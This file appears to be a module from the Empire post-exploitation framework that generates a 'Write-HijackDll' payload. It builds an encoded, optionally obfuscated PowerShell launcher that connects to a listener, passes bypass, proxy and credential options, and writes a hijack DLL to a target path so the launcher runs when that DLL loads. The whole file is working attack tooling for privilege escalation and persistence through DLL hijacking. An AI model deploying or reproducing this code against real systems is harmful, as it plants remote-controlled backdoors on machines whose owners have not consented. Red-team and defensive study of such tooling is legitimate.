from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):
        # staging options
        launcher_obfuscate = params["Obfuscate"].lower() == "true"
        launcher_obfuscate_command = params["ObfuscateCommand"]

        module_name = "Write-HijackDll"

        script_end = ";" + module_name + " "

        # extract all of our options
        listener_name = params["Listener"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]

        # generate the launcher code
        launcher = main_menu.stagers.generate_launcher(
            listenerName=listener_name,
            language="powershell",
            encode=True,
            obfuscate=launcher_obfuscate,
            obfuscation_command=launcher_obfuscate_command,
            userAgent=user_agent,
            proxy=proxy,
            proxyCreds=proxy_creds,
            bypasses=params["Bypasses"],
        )

        if launcher == "":
            raise ModuleValidationException("Error in launcher command generation.")

        else:
            out_file = params["DllPath"]
            script_end += ' -Command "%s"' % (launcher)
            script_end += " -DllPath %s" % (out_file)

        outputf = params.get("OutputFunction", "Out-String")

        script_end += (
            f" | {outputf} | "
            + '%{$_ + "`n"};"`n'
            + str(module.name.split("/")[-1])
            + ' completed!"'
        )

        return script, script_end
